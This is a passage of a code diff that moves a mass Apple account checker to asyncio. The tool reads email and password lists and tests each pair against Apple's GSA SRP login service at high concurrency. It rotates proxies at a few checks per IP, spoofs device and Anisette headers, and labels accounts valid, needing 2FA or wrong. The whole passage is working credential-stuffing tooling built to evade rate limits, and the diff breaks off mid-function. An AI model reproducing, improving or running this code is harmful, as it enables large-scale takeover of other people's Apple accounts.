@@ -1,0 +1,954 @@
+diff --git a/gsafast/ippool.py b/gsafast/ippool.py
+index a0e697b..e5f892b 100644
+--- a/gsafast/ippool.py
++++ b/gsafast/ippool.py
+@@ -185,8 +185,8 @@ class IpPool:
+             self._stop.wait(self.interval)
+ 
+     # ---------------------------------------------------------------- 取还
+-    def acquire(self, tid, wait=30.0):
+-        """返回 (proxy, expires_at)；取用不排队，只有池真的空了才会短暂等待。"""
++    def acquire_nowait(self, tid):
++        """异步调度器用的非阻塞取用；池空时不睡眠也不计一次 blocked。"""
+         bucket = self._local.get(tid)
+         now = time.monotonic()
+         if bucket:
+@@ -196,17 +196,23 @@ class IpPool:
+                     self.stats['local_hit'] += 1
+                     return proxy, exp
+                 self.stats['expired'] += 1
+-        while True:                                  # 逐条取，过期的直接丢，直到拿到能用的
++        while True:
+             try:
+                 proxy, exp = self._shared.get_nowait()
+             except queue.Empty:
+-                break
++                return None, 0.0
+             if exp > time.monotonic():
+                 self.stats['shared_hit'] += 1
+                 with self._seen_lock:
+                     self._seen.pop(proxy, None)
+                 return proxy, exp
+             self.stats['expired'] += 1
++
++    def acquire(self, tid, wait=30.0):
++        """返回 (proxy, expires_at)；取用不排队，只有池真的空了才会短暂等待。"""
++        proxy, exp = self.acquire_nowait(tid)
++        if proxy:
++            return proxy, exp
+         # 这里只等 supplier 补货，工作线程绝不自己发 API
+         deadline = time.monotonic() + max(0.0, float(wait))
+         while time.monotonic() < deadline and not self._stop.is_set():
+diff --git a/requirements.txt b/requirements.txt
+index 82344a9..d857243 100644
+--- a/requirements.txt
++++ b/requirements.txt
+@@ -10,6 +10,9 @@ portalocker>=2.7
+ # 本体会在 connect(proxy=...) 时反复 ImportError，所以需要 python-socks。
+ websockets>=15,<18
+ python-socks>=2.7,<3
++# 热路径改用 asyncio：600 个并发账号不再需要 600 个 OS 线程
++aiohttp>=3.10,<4
++aiohttp-socks>=0.10,<1
+ 
+ # 测试（可选）：pip install pytest 后可跑 pytest tests/
+ # pytest>=8.0
+diff --git a/run_mp.py b/run_mp.py
+index d970efc..10ba14d 100644
+--- a/run_mp.py
++++ b/run_mp.py
+@@ -1,7 +1,7 @@
+ #!/usr/bin/env python3
+-"""多进程调度：把账号和设备槽位切开，起 N 个 simple.py 子进程，汇总成一份 live.json。
++"""多进程调度：把账号和设备槽位切开，起 N 个异步子进程，汇总 live.json。
+ 
+-为什么要多进程：Python 单进程被 GIL 卡在 1 核，4 核机器必须 4 进程才能吃满。
++网络等待使用 asyncio；多进程只用于分摊 SRP/PBKDF2 的 CPU 工作。
+ 
+     python3 run_mp.py --processes 4 --threads 500 --limit 0
+     python3 run_mp.py --processes 4 --threads 500 --limit 20000 --per-ip 6
+@@ -27,6 +27,7 @@ from simple import proxy_api_default      # noqa: E402  凭据统一从 secrets/
+ PYTHON = os.path.join(HERE, '.venv', 'bin', 'python')
+ DATA = os.path.join(HERE, 'data')
+ LIVE = os.path.join(DATA, 'live.json')
++WORKER = os.path.join(HERE, 'simple_async.py')
+ 
+ 
+ def count_accounts(path):
+@@ -65,7 +66,7 @@ def build_jobs(args, total):
+ def spawn(args, jobs):
+     procs = []
+     for job in jobs:
+-        cmd = [PYTHON, os.path.join(HERE, 'simple.py'),
++        cmd = [PYTHON, WORKER,
+                '--accounts', args.accounts,
+                '--threads', str(args.threads),
+                '--offset', str(job['offset']),
+@@ -186,10 +187,10 @@ def merge(jobs, started, expected_total=0, wall_started=None):
+         'rate': round(done / elapsed, 2) if elapsed else 0,
+         'per_hour': round(done / elapsed * 3600) if elapsed else 0,
+         'eta': round((total - done) / (done / elapsed), 0) if done and elapsed else None,
+-        # 页面会再显示“每进程线程 × 进程数”，这里必须保留每进程口径，
++    # 页面会再显示“每进程协程 × 进程数”，这里必须保留每进程口径，
+         # 不能提前乘一次，否则 2×400 会被误显示成 800×2。
+         'threads': jobs[0].get('threads', 0) if jobs else 0,
+-        'backend': 'gmpy2',
++        'backend': 'gmpy2', 'engine': 'asyncio',
+         'cpu_seconds': round(cpu, 2),
+         'cpu_cores': round(cpu / elapsed, 3) if elapsed else 0,
+         'cpu_per_account': round(cpu / done * 1000, 1) if done else 0,
+@@ -223,7 +224,7 @@ def main():
+     ap.add_argument('--accounts', default='/Users/xxx/Downloads/2026-11-23_全部结果.txt')
+     ap.add_argument('--api', default=proxy_api_default(), help='代理接口，含 {num} 占位符')
+     ap.add_argument('--processes', type=int, default=4)
+-    ap.add_argument('--threads', type=int, default=500, help='每进程线程数')
++    ap.add_argument('--threads', type=int, default=500, help='每进程并发协程数')
+     ap.add_argument('--limit', type=int, default=0, help='总条数，0=全部')
+     ap.add_argument('--offset', type=int, default=0)
+     ap.add_argument('--slot-base', type=int, default=0, dest='slot_base')
+@@ -261,9 +262,9 @@ def main():
+     total = count_accounts(args.accounts)
+     jobs = build_jobs(args, total)
+     need_slots = args.slot_base + len(jobs) * args.threads
+-    print(f'账号总数 {total}，切成 {len(jobs)} 个进程 × {args.threads} 线程 '
+-          f'= {len(jobs)*args.threads} 线程，设备槽位 1-{need_slots}')
+-    print(f'内存预估: 线程栈 {len(jobs)*args.threads} MB + 每进程约 150MB Python')
++    print(f'账号总数 {total}，切成 {len(jobs)} 个进程 × {args.threads} 协程 '
++          f'= {len(jobs)*args.threads} 并发，设备槽位 1-{need_slots}')
++    print(f'内存预估: 协程任务 + 每进程约 150MB Python（无每协程线程栈）')
+     if not jobs:
+         raise SystemExit(f'没有可处理的账号：文件 {args.accounts} 在 offset={args.offset} '
+                          f'之后没有记录（共 {total} 条）')
+diff --git a/web.py b/web.py
+index 62a36fe..f9ddf9e 100644
+--- a/web.py
++++ b/web.py
+@@ -270,7 +270,7 @@ def start_job(accounts, threads, limit, processes=1, verify_web=False,
+         pass
+     processes = max(1, min(int(processes or 1), 8))
+     if processes > 1:
+-        # 多进程：4 核机器要吃满必须多进程（单进程被 GIL 卡在 1 核）
++        # 多进程仍用于分配 CPU 密集的 SRP；每个子进程内是 asyncio 连接。
+         cmd = [PYTHON, os.path.join(HERE, 'run_mp.py'),
+                '--accounts', accounts, '--processes', str(processes),
+                '--threads', str(threads)]
+@@ -291,7 +291,7 @@ def start_job(accounts, threads, limit, processes=1, verify_web=False,
+         if anisette_proxy:
+             cmd.append('--anisette-proxy')
+     else:
+-        cmd = [PYTHON, os.path.join(HERE, 'simple.py'),
++        cmd = [PYTHON, os.path.join(HERE, 'simple_async.py'),
+                '--accounts', accounts, '--threads', str(threads),
+                '--live', LIVE, '--limit', str(limit),
+                '--per-ip', str(per_ip), '--ip-ttl', str(ip_ttl),
+@@ -316,7 +316,7 @@ def start_job(accounts, threads, limit, processes=1, verify_web=False,
+     total_threads = threads * processes
+     return {'ok': True, 'pid': proc.pid, 'threads': threads, 'processes': processes,
+             'limit': limit, 'total_threads': total_threads,
+-            'warmup_hint': (f'已启动 {processes} 进程 × {threads} 线程 = {total_threads} 线程；'
++            'warmup_hint': (f'已启动 {processes} 进程 × {threads} 协程 = {total_threads} 并发；'
+                             f'首轮注册设备约 {max(4, total_threads // 16)} 秒后才会有速度')}
+ 
+ 
+@@ -798,8 +798,8 @@ align-items:center;justify-content:center;backdrop-filter:blur(2px)}
+         <div class="row2">
+           <div><input type="number" id="processes" value="2" min="1" max="8" placeholder="进程数">
+             <div class="hint">进程数</div></div>
+-          <div><input type="number" id="threads" value="1000" min="1" max="2000" placeholder="线程/进程">
+-            <div class="hint">每进程线程</div></div>
++          <div><input type="number" id="threads" value="1000" min="1" max="2000" placeholder="协程/进程">
++            <div class="hint">每进程协程</div></div>
+         </div>
+         <div class="hint" id="rechint"></div>
+       </div>
+@@ -878,7 +878,7 @@ align-items:center;justify-content:center;backdrop-filter:blur(2px)}
+ 
+         <div class="meta" style="display:flex;justify-content:space-between;
+              padding:12px 0;border-top:1px solid var(--line);margin-top:12px;font-size:12px;color:var(--dim)">
+-          <span id="mThreads">-- 线程</span>
++          <span id="mThreads">-- 协程</span>
+           <span id="mCpu">CPU -- 核</span>
+           <span id="mP50">p50 -- ms</span>
+           <span id="mOtp">公共头 命中 -- / 拉取 --</span>
+@@ -1117,11 +1117,11 @@ $('refresh').onclick = () => { shownAccounts=null; tick(); };
+ /* ---- 推荐提示 ---- */
+ function refreshHint(){
+   const p=+$('processes').value, t=+$('threads').value, total=p*t, warn=[];
+-  if(p===1 && t>1200) warn.push('单进程超 1200 线程会变慢，建议多进程');
+-  if(total>3000) warn.push(`总线程 ${total} 可能超出 4G 内存`);
+-  if(p>1 && t>1200) warn.push('每进程超 1200 线程边际递减');
++  if(p===1 && t>1600) warn.push('单进程超 1600 协程会放大上游长尾');
++  if(total>4000) warn.push(`总协程 ${total} 可能放大代理排队`);
++  if(p>1 && t>1600) warn.push('每进程超 1600 协程边际递减');
+   $('rechint').textContent = warn.length ? '⚠ '+warn.join('；')
+-    : `共 ${total} 线程 · 4 核 4G 推荐 2 × 1000`;
++    : `共 ${total} 协程 · asyncio 异步连接`;
+   $('rechint').style.color = warn.length ? 'var(--amber)' : 'var(--dim)';
+   $('modeTag').textContent = p>1 ? `${p} 进程` : '单进程';
+   $('rechint').style.color = warn.length ? 'var(--amber)' : 'var(--dim)';
+@@ -1176,10 +1176,10 @@ async function tick(){
+   $('pSpeed').textContent = `${num(d.per_hour)} 条/小时`;
+ 
+   $('started').textContent = d.started || '--';
+-  $('backend').textContent = d.backend || '--';
++  $('backend').textContent = [d.backend, d.engine].filter(Boolean).join('·') || '--';
+   $('backend').style.color = d.backend==='gmpy2' ? 'var(--green)' : 'var(--red)';
+   $('mThreads').textContent = d.processes>1
+-    ? `${d.threads} 线程 × ${d.processes} 进程` : `${d.threads} 线程`;
++    ? `${d.threads} 协程 × ${d.processes} 进程` : `${d.threads} 协程`;
+   const procCores = d.proc_cpu_cores ?? d.cpu_cores ?? 0;
+   $('mCpu').textContent = `CPU ${procCores.toFixed(2)} 核`
+     + (d.cpu_per_account ? ` · ${d.cpu_per_account.toFixed(1)} ms/条` : '');
+diff --git a/fastcheck/protocols/gsa_async.py b/fastcheck/protocols/gsa_async.py
+new file mode 100644
+index 0000000..4bcc6fd
+--- /dev/null
++++ b/fastcheck/protocols/gsa_async.py
+@@ -0,0 +1,246 @@
++"""Async GSA transport.
++
++The SRP/plist verdict logic is identical to :mod:`gsa_status`, but sockets are
++driven by aiohttp instead of dedicating one OS thread to every in-flight
++account.  CPU-heavy SRP operations are sent to asyncio's small bounded executor.
++"""
++from __future__ import annotations
++
++import asyncio
++import plistlib
++import time
++from dataclasses import dataclass
++
++from .apple_trust import gsa_context
++from .srp_auth import GrandSlamSRPClient as SRPClient
++from . import gsa_status as sync
++
++try:
++    import aiohttp
++    from aiohttp_socks import ProxyConnector
++except ImportError as exc:  # pragma: no cover - exercised by deployment check
++    aiohttp = None
++    ProxyConnector = None
++    _IMPORT_ERROR = exc
++else:
++    _IMPORT_ERROR = None
++
++
++GSA_URL = sync.GSA_URL
++HEADERS = dict(sync._HEADERS)
++
++
++def available() -> bool:
++    return aiohttp is not None and ProxyConnector is not None
++
++
++def require_available() -> None:
++    if not available():
++        raise RuntimeError(
++            "async engine requires aiohttp and aiohttp-socks; "
++            "run: pip install -r requirements.txt"
++        ) from _IMPORT_ERROR
++
++
++def _proxy_url(value: str) -> tuple[str, bool]:
++    """aiohttp-socks spells remote-DNS SOCKS as socks5 + rdns=True."""
++    if value.startswith("socks5h://"):
++        return "socks5://" + value[len("socks5h://"):], True
++    return value, value.startswith("socks")
++
++
++@dataclass
++class AsyncOutcome:
++    payload: dict | None
++    error: str = ""
++    kind: str = ""
++    http_status: int = 0
++
++
++class AsyncGsaSession:
++    """One coroutine-owned keep-alive pool for one short-lived proxy exit."""
++
++    def __init__(self, proxy: str | None):
++        require_available()
++        self.proxy = proxy
++        self._session = None
++
++    async def open(self) -> "AsyncGsaSession":
++        if self._session is not None:
++            return self
++        kwargs = dict(ssl=gsa_context(), limit=2, limit_per_host=2,
++                      keepalive_timeout=20)
++        if self.proxy:
++            url, rdns = _proxy_url(self.proxy)
++            connector = ProxyConnector.from_url(url, rdns=rdns, **kwargs)
++        else:
++            connector = aiohttp.TCPConnector(**kwargs)
++        self._session = aiohttp.ClientSession(
++            connector=connector, trust_env=False, raise_for_status=False)
++        return self
++
++    async def close(self) -> None:
++        if self._session is not None:
++            await self._session.close()
++            self._session = None
++
++    async def __aenter__(self):
++        return await self.open()
++
++    async def __aexit__(self, *_):
++        await self.close()
++
++    async def post(self, body: bytes, cpd: dict, timeout: float,
++                   *, client_info: str = "", user_agent: str | None = None) -> AsyncOutcome:
++        await self.open()
++        headers = dict(HEADERS)
++        headers["X-MMe-Client-Info"] = client_info
++        if user_agent:
++            if len(user_agent) > 4096 or "\r" in user_agent or "\n" in user_agent:
++                return AsyncOutcome(None, "Invalid provider user agent", "anisette")
++            headers["User-Agent"] = user_agent
++        total = max(1.0, float(timeout))
++        client_timeout = aiohttp.ClientTimeout(
++            total=total, connect=min(sync._CONNECT_TIMEOUT_CAP, total),
++            sock_connect=min(sync._CONNECT_TIMEOUT_CAP, total), sock_read=total)
++        try:
++            async with self._session.post(
++                    GSA_URL, data=body, headers=headers, timeout=client_timeout,
++                    allow_redirects=False) as response:
++                code = response.status
++                raw = await response.read()
++                if len(raw) > 2 * 1024 * 1024:
++                    return AsyncOutcome(None, "response exceeds 2 MiB", "protocol", code)
++        except Exception as exc:  # noqa: BLE001
++            kind, detail = sync._classify_transport(exc, self.proxy, redactions=[
++                cpd.get(key) for key in ("X-Apple-I-MD", "X-Apple-I-MD-M",
++                                         "X-Apple-I-MD-LU", "X-Mme-Device-Id")])
++            return AsyncOutcome(None, detail, kind)
++        try:
++            payload = plistlib.loads(raw)
++        except Exception as exc:  # noqa: BLE001
++            return AsyncOutcome(None, f"plist: {type(exc).__name__}", "protocol", code)
++        if not isinstance(payload, dict):
++            return AsyncOutcome(None, "plist root is not a dictionary", "protocol", code)
++        if code < 200 or code >= 300:
++            return AsyncOutcome(None, f"HTTP {code}", sync._error_kind(f"HTTP {code}"), code)
++        return AsyncOutcome(payload, http_status=code)
++
++
++def _result(status: str, detail: str, started: float, *, kind: str = "",
++            stage: str = "", http: int = 0) -> dict:
++    result = {
++        "status": status, "detail": detail,
++        "ms": int((time.time() - started) * 1000),
++        "kind": kind or ("" if status != "error" else sync._error_kind(detail)),
++        "stage": stage,
++    }
++    if http:
++        result["http"] = http
++    return result
++
++
++async def check(email: str, password: str, proxy: str | None,
++                timeout: float = 15.0, retries: int = 0, *, identity: dict,
++                session: AsyncGsaSession | None = None) -> dict:
++    """Async equivalent of ``gsa_status.check`` using two non-blocking POSTs."""
++    if sync.mock_enabled():
++        await asyncio.sleep(0.01)
++        value = sync.MOCK_RESULTS[sync._seed(email, "mock") % len(sync.MOCK_RESULTS)]
++        return _result(value, "", time.time(), stage="mock")
++    started = time.time()
++    owned = session is None
++    transport = session or AsyncGsaSession(proxy)
++    await transport.open()
++    last = None
++    try:
++        for attempt in range(max(0, retries) + 1):
++            if attempt and last is not None and not sync.is_transient(
++                    last.get("detail", ""), last.get("kind", "")):
++                return last
++            last = await _once(email, password, timeout, started, identity, transport)
++            if last.get("status") != "error" or not sync.is_transient(
++                    last.get("detail", ""), last.get("kind", "")):
++                return last
++        return last or _result("error", "no attempt made", started)
++    finally:
++        if owned:
++            await transport.close()
++
++
++async def _once(email: str, password: str, timeout: float, started: float,
++                identity: dict, transport: AsyncGsaSession) -> dict:
++    try:
++        cpd = sync._build_cpd(identity, email)
++        srp = await asyncio.to_thread(SRPClient, email, password)
++    except Exception as exc:  # noqa: BLE001
++        return _result("error", f"srp init: {type(exc).__name__}", started,
++                       kind="protocol", stage="init")
++    init_body = plistlib.dumps({
++        "Header": {"Version": "1.0.1"},
++        "Request": {"cpd": cpd, "u": email, "A2k": srp.A_bytes,
++                    "ps": ["s2k", "s2k_fo"], "o": "init"},
++    })
++    init = await transport.post(
++        init_body, cpd, timeout, client_info=sync._client_info(identity),
++        user_agent=identity.get("User-Agent"))
++    if init.payload is None:
++        return _result("error", f"init {init.error}", started, kind=init.kind,
++                       stage="init", http=init.http_status)
++    response = init.payload.get("Response") or {}
++    status = response.get("Status") or {}
++    if status.get("ec") != 0:
++        verdict, detail = sync.classify(status.get("ec"), status.get("em", "") or "")
++        if verdict == "wrong_password":
++            result = _result("error", "init did not accept password proof", started,
++                             kind="protocol", stage="init", http=init.http_status)
++        else:
++            result = _result(verdict, detail, started, stage="init", http=init.http_status)
++        return sync._with_apple_message(result, status, email, password,
++                                        transport.proxy, identity)
++    try:
++        if "c" not in response:
++            raise KeyError("c")
++        m1 = await asyncio.to_thread(
++            srp.process_challenge, response["s"], response["B"],
++            response["i"], response["sp"])
++    except Exception as exc:  # noqa: BLE001
++        return _result("error", f"srp: {type(exc).__name__}", started,
++                       kind="protocol", stage="init", http=init.http_status)
++    done_body = plistlib.dumps({
++        "Header": {"Version": "1.0.1"},
++        "Request": {"cpd": cpd, "u": email, "M1": m1,
++                    "c": response["c"], "o": "complete"},
++    })
++    done = await transport.post(
++        done_body, cpd, timeout, client_info=sync._client_info(identity),
++        user_agent=identity.get("User-Agent"))
++    if done.payload is None:
++        return _result("error", f"complete {done.error}", started, kind=done.kind,
++                       stage="complete", http=done.http_status)
++    final_response = done.payload.get("Response") or {}
++    status2 = final_response.get("Status") or {}
++    if status2.get("ec") in (-22025, -22420):
++        result = _result("error", "authentication did not complete", started,
++                         kind="protocol", stage="complete", http=done.http_status)
++        return sync._with_apple_message(result, status2, email, password,
++                                        transport.proxy, identity)
++    verdict, detail = sync.classify(status2.get("ec"), status2.get("em", "") or "")
++    if verdict == "valid":
++        proof = final_response.get("M2")
++        valid_proof = isinstance(proof, bytes) and await asyncio.to_thread(srp.verify_M2, proof)
++        if not valid_proof:
++            return _result("error", "missing or invalid GSA server proof", started,
++                           kind="protocol", stage="complete", http=done.http_status)
++        raw_auth_type = status2.get("au")
++        auth_type = raw_auth_type.strip() if isinstance(raw_auth_type, str) else ""
++        if auth_type:
++            verdict, detail = "need_2fa", f"au={auth_type[:80]}"
++        result = _result(verdict, detail, started, stage="complete", http=done.http_status)
++        result.update(password_verified=True,
++                      two_factor_status="required" if verdict == "need_2fa" else "unknown",
++                      auth_type=auth_type[:80] if auth_type else "none")
++        return result
++    result = _result(verdict, detail, started, stage="complete", http=done.http_status)
++    return sync._with_apple_message(result, status2, email, password,
++                                    transport.proxy, identity)
+diff --git a/simple_async.py b/simple_async.py
+new file mode 100644
+index 0000000..0ea52a6
+--- /dev/null
++++ b/simple_async.py
+@@ -0,0 +1,417 @@
++#!/usr/bin/env python3
++"""Coroutine GSA runner.
++
++Hot-path Apple requests use aiohttp/aiohttp-socks.  A small executor is kept
++only for native SRP and the legacy device/Anisette bootstrap APIs; account
++concurrency is represented by asyncio tasks, not one OS thread per account.
++"""
++from __future__ import annotations
++
++import argparse
++import asyncio
++import collections
++import concurrent.futures
++import json
++import os
++import random
++import signal
++import statistics
++import sys
++import threading
++import time
++
++from simple import (device_profile, load_accounts, local_exception_result,
++                    proxy_api_default, refine_status, retry_kind)
++
++
++def parser() -> argparse.ArgumentParser:
++    ap = argparse.ArgumentParser(description="asyncio GSA checker")
++    ap.add_argument('--accounts', required=True)
++    ap.add_argument('--api', default=proxy_api_default())
++    ap.add_argument('--device-root', default='./data/devices-simple')
++    ap.add_argument('--threads', type=int, default=200,
++                    help='兼容旧参数：现在表示每进程并发协程数')
++    ap.add_argument('--limit', type=int, default=0)
++    ap.add_argument('--offset', type=int, default=0)
++    ap.add_argument('--slot-base', type=int, default=0, dest='slot_base')
++    ap.add_argument('--timeout', type=float, default=10.0)
++    ap.add_argument('--retries', type=int, default=0)
++    ap.add_argument('--retry', type=int, default=2)
++    ap.add_argument('--item-timeout', type=float, default=20.0, dest='item_timeout')
++    ap.add_argument('--no-register', action='store_true')
++    ap.add_argument('--register-timeout', type=float, default=20.0, dest='register_timeout')
++    ap.add_argument('--anisette-timeout', type=float, default=30.0, dest='anisette_timeout')
++    ap.add_argument('--anisette-workers', type=int, default=0, dest='anisette_workers')
++    ap.add_argument('--anisette-proxy', action='store_true', dest='anisette_proxy')
++    ap.add_argument('--verify-web', action='store_true', dest='verify_web')
++    ap.add_argument('--per-ip', type=int, default=6, dest='per_ip')
++    ap.add_argument('--otp-reuse', type=int, default=15, dest='otp_reuse')
++    ap.add_argument('--ip-ttl', type=float, default=50.0, dest='ip_ttl')
++    ap.add_argument('--ip-batch', type=int, default=1000, dest='ip_batch')
++    ap.add_argument('--ip-interval', type=float, default=3.0, dest='ip_interval')
++    ap.add_argument('--out', default='./data/simple-run.jsonl')
++    ap.add_argument('--live', default='./data/live.json')
++    return ap
++
++
++def _mock_identity() -> dict:
++    return {
++        'X-Apple-I-MD': 'mock', 'X-Apple-I-MD-M': 'mock',
++        'X-Apple-I-MD-LU': 'mock', 'X-Apple-I-MD-RINFO': '17106176',
++        'X-Mme-Device-Id': '00000000-0000-0000-0000-000000000000',
++        'X-MMe-Client-Info': '<MacBookPro18,1> <macOS;14.0;23A344>',
++        'User-Agent': 'akd/1.0',
++    }
++
++
++async def run(args) -> int:
++    from fastcheck.devices import DevicePool, count_registered_devices
++    from fastcheck.protocols import gsa_async as gs
++    from fastcheck.protocols.srp_auth import SRP_MATH_BACKEND
++    from fastcheck.status import result_bucket
++    from gsafast.ippool import IpPool
++
++    gs.require_available()
++    full = load_accounts(args.accounts, 0)
++    start_at = max(0, args.offset)
++    rows = full[start_at:start_at + args.limit] if args.limit else full[start_at:]
++    concurrency = max(1, min(args.threads, len(rows) or 1))
++    mock = os.environ.get('FASTCHECK_MOCK') == '1'
++    os.makedirs(os.path.dirname(args.out) or '.', exist_ok=True)
++    os.makedirs(os.path.dirname(args.live) or '.', exist_ok=True)
++
++    # CPU work stays bounded near core count.  Blocking device bootstrap has a
++    # separate executor so it cannot starve SRP while many slots initialise.
++    loop = asyncio.get_running_loop()
++    cpu_workers = max(2, min(8, os.cpu_count() or 4))
++    cpu_pool = concurrent.futures.ThreadPoolExecutor(
++        max_workers=cpu_workers, thread_name_prefix='srp')
++    io_pool = concurrent.futures.ThreadPoolExecutor(
++        max_workers=min(64, concurrency), thread_name_prefix='device-io')
++    loop.set_default_executor(cpu_pool)
++
++    ip_pool = None
++    if not mock:
++        if not args.api or '{num}' not in args.api:
++            raise SystemExit('没有代理接口：设置 GSA_PROXY_API 或 secrets.json')
++        ip_pool = IpPool(args.api, threads=concurrency, ttl=args.ip_ttl,
++                         per_ip=args.per_ip, batch=args.ip_batch,
++                         refill_interval=args.ip_interval)
++        warmed = await loop.run_in_executor(io_pool, ip_pool.warm, 1)
++        ip_pool.start()
++        print(f'异步 IP 池预热 {warmed} 条')
++
++    queue = asyncio.Queue()
++    for row in rows:
++        queue.put_nowait(row)
++    stop = asyncio.Event()
++    for sig in (signal.SIGINT, signal.SIGTERM):
++        try:
++            loop.add_signal_handler(sig, stop.set)
++        except (NotImplementedError, RuntimeError):
++            pass
++
++    started = time.perf_counter()
++    wall_started = time.time()
++    proc_cpu0 = time.process_time()
++    state = {
++        'done': 0, 'by_status': {}, 'recent': collections.deque(maxlen=12),
++        'samples': [], 'retried': 0, 'by_retry': {}, 'budget_hit': 0,
++        'otp_hit': 0, 'otp_fetch': 0, 'ip_fail': 0,
++        'device_in_use': set(), 'device_registering': set(),
++        'register_errors': 0, 'register_error_types': {}, 'worker_errors': [],
++    }
++    sink = open(args.out, 'w', encoding='utf-8')
++    write_buffer: list[str] = []
++    anisette_limit = args.anisette_workers or concurrency
++    anisette_gate = asyncio.Semaphore(max(1, anisette_limit))
++    register_gate = asyncio.Semaphore(min(64, concurrency))
++
++    async def acquire_ip(tid: int, wait: float = 60.0):
++        if mock:
++            return 'socks5://127.0.0.1:9', time.monotonic() + 3600
++        deadline = time.monotonic() + wait
++        while not stop.is_set() and time.monotonic() < deadline:
++            proxy, expires = ip_pool.acquire_nowait(tid)
++            if proxy:
++                return proxy, expires
++            await asyncio.sleep(0.1 + random.random() * 0.1)
++        state['ip_fail'] += 1
++        return None, 0.0
++
++    def prepare_slot_sync(tid: int, route: str | None):
++        if mock:
++            return {'pool': None, 'info': _mock_identity(), 'profile': None,
++                    'slot': args.slot_base + tid + 1}
++        slot = args.slot_base + tid + 1
++        pool = DevicePool(args.device_root, 'https://new.ani.sidestore.io',
++                          max_devices=args.slot_base + concurrency)
++        profile = device_profile(pool, slot)
++        info = pool.info(max(args.timeout, 20),
++                         proxy=route if args.anisette_proxy else None,
++                         provider_direct=not args.anisette_proxy)
++        info = dict(info, client_info=profile['client_info'],
++                    user_agent=profile['user_agent'])
++        ready = pool.inspect(slot).get('state') == 'ready'
++        if not args.no_register and not ready:
++            pool.fetch_headers(
++                slot, info, max(1.0, args.register_timeout), registered=False,
++                proxy=route if args.anisette_proxy else None,
++                provider_direct=not args.anisette_proxy)
++        return {'pool': pool, 'info': info, 'profile': profile, 'slot': slot}
++
++    def fetch_otp_sync(context, route):
++        if mock:
++            return _mock_identity()
++        raw = context['pool'].fetch_headers(
++            context['slot'], context['info'], max(args.timeout, 20), registered=True,
++            proxy=route if args.anisette_proxy else None,
++            provider_direct=not args.anisette_proxy)
++        profile = context['profile']
++        if profile and isinstance(raw, dict):
++            raw = dict(raw)
++            raw['X-MMe-Client-Info'] = profile['client_info']
++            raw['X-Mme-Client-Info'] = profile['client_info']
++            raw.setdefault('User-Agent', profile['user_agent'])
++        return raw
++
++    async def prepare_slot(tid, route):
++        slot = args.slot_base + tid + 1
++        state['device_registering'].add(slot)
++        try:
++            async with register_gate:
++                return await loop.run_in_executor(io_pool, prepare_slot_sync, tid, route)
++        finally:
++            state['device_registering'].discard(slot)
++
++    async def fetch_otp(context, route):
++        async with anisette_gate:
++            return await loop.run_in_executor(io_pool, fetch_otp_sync, context, route)
++
++    def record(row):
++        state['done'] += 1
++        final = row['final']
++        state['by_status'][final] = state['by_status'].get(final, 0) + 1
++        if row['attempts'] > 1:
++            state['retried'] += 1
++            reason = row.get('retry_reason') or '?'
++            state['by_retry'][reason] = state['by_retry'].get(reason, 0) + 1
++        if row.get('budget_hit'):
++            state['budget_hit'] += 1
++        if state['done'] % 10 == 0:
++            state['samples'].append(row)
++            if len(state['samples']) > 4000:
++                del state['samples'][:-4000]
++        state['recent'].append(row)
++        write_buffer.append(json.dumps(row, ensure_ascii=False))
++        if len(write_buffer) >= 200:
++            sink.write('\n'.join(write_buffer) + '\n')
++            sink.flush()
++            write_buffer.clear()
++
++    async def worker(tid: int):
++        slot = args.slot_base + tid + 1
++        route = expires = None
++        transport = None
++        context = None
++        cached_otp = None
++        otp_used = 0
++        try:
++            route, expires = await acquire_ip(tid)
++            if not route:
++                return
++            while context is None and not stop.is_set():
++                try:
++                    context = await prepare_slot(tid, route)
++                except Exception as exc:  # noqa: BLE001
++                    state['register_errors'] += 1
++                    name = type(exc).__name__
++                    state['register_error_types'][name] = state['register_error_types'].get(name, 0) + 1
++                    if ip_pool:
++                        ip_pool.release(tid, route, expires, healthy=False)
++                    route, expires = await acquire_ip(tid, 20)
++                    if not route:
++                        await asyncio.sleep(0.5)
++            if context is None:
++                return
++            state['device_in_use'].add(slot)
++            served = 0
++            transport = gs.AsyncGsaSession(route)
++            await transport.open()
++            while not stop.is_set():
++                if (not route or served >= args.per_ip
++                        or (expires and expires <= time.monotonic())):
++                    await transport.close()
++                    if ip_pool and route:
++                        ip_pool.release(tid, route, expires, healthy=served > 0)
++                    route, expires = await acquire_ip(tid)
++                    if not route:
++                        await asyncio.sleep(0.5)
++                        continue
++                    transport = gs.AsyncGsaSession(route)
++                    await transport.open()
++                    served = 0
++                try:
++                    email, password = queue.get_nowait()
++                except asyncio.QueueEmpty:
++                    break
++                t0 = time.perf_counter()
++                attempts = 0
++                retry_reason = ''
++                budget_hit = False
++                result = None
++                try:
++                    if cached_otp is None or args.otp_reuse <= 0 or otp_used >= args.otp_reuse:
++                        cached_otp = await fetch_otp(context, route)
++                        otp_used = 0
++                        state['otp_fetch'] += 1
++                    else:
++                        state['otp_hit'] += 1
++                    otp_used += 1
++                    deadline = t0 + max(1.0, args.item_timeout)
++                    while True:
++                        attempts += 1
++                        remaining = deadline - time.perf_counter()
++                        if remaining < 1.0:
++                            result = {'status': 'timeout', 'kind': 'budget',
++                                      'detail': '单条预算耗尽', 'http': 0}
++                            retry_reason = 'budget'
++                            budget_hit = True
++                            break
++                        try:
++                            result = await asyncio.wait_for(
++                                gs.check(email, password, route,
++                                         timeout=max(2.0, min(args.timeout, remaining / 2)),
++                                         retries=args.retries, identity=cached_otp,
++                                         session=transport), timeout=remaining)
++                        except asyncio.TimeoutError:
++                            result = {'status': 'timeout', 'kind': 'budget',
++                                      'detail': '单条预算耗尽', 'http': 0}
++                        status = refine_status(result, result_bucket(result))
++                        kind, why = retry_kind(result, status)
++                        if kind is None or attempts > args.retry:
++                            retry_reason = why if attempts > 1 else ''
++                            break
++                        retry_reason = why
++                        await transport.close()
++                        if ip_pool:
++                            ip_pool.release(tid, route, expires, healthy=False)
++                        route, expires = await acquire_ip(tid, 20)
++                        if not route:
++                            break
++                        transport = gs.AsyncGsaSession(route)
++                        await transport.open()
++                        if str(kind) == 'env':
++                            cached_otp = await fetch_otp(context, route)
++                            otp_used = 1
++                except Exception as exc:  # noqa: BLE001
++                    result = local_exception_result(exc)
++                elapsed = (time.perf_counter() - t0) * 1000
++                result = result or {'status': 'error', 'detail': 'no result'}
++                raw_status = str(result.get('status') or 'error')
++                final = refine_status(result, result_bucket(result))
++                row = {
++                    'tid': tid, 'slot': slot, 'email': email,
++                    'raw_status': raw_status, 'status': final, 'final': final,
++                    'ec': result.get('apple_ec'),
